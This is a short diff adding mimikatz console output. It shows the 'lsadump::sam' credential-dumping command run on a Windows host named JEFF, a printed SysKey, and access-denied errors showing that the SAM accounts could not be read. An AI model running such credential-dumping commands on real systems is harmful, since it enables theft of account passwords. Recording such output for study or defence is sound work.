@@ -1,0 +1,5 @@
+mimikatz # lsadump::sam
+Domain : JEFF
+SysKey : 5022073fbef77f60f96d8dd017f66b26
+ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
+ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)
